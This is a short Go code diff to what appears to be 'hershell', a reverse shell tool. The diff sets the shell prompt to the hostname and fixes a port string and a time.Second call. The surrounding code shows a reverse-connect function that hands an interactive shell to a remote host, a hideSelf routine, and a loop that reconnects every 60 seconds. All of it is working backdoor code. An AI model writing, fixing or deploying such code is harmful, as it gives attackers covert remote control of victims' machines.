@@ -34,7 +34,10 @@ func interactiveShell(conn net.Conn) {
 		prompt  = "[hershell]> "
 		scanner = bufio.NewScanner(conn)
 	)
-
+	host, err := os.Hostname()
+	if err == nil {
+		prompt = host
+	}
 	conn.Write([]byte(prompt))
 
 	for scanner.Scan() {
@@ -112,6 +115,7 @@ func reverse(connectString string, fingerprint []byte) {
 		// os.Exit(errBadFingerprint)
 		return
 	}
+
 	interactiveShell(conn)
 }
 
@@ -140,7 +144,7 @@ func hideSelf(pid int) {
 
 func main() {
 
-	_, err := net.Listen("tcp", ":"+65534)
+	_, err := net.Listen("tcp", ":65534")
 	if err != nil {
 		return
 	}
@@ -154,7 +158,7 @@ func main() {
 		}
 		for {
 			reverse(connectString, bytesFingerprint)
-			time.Sleep(time.Duration(60) * time.Second())
+			time.Sleep(time.Duration(60) * time.Second)
 		}
 	}
 }
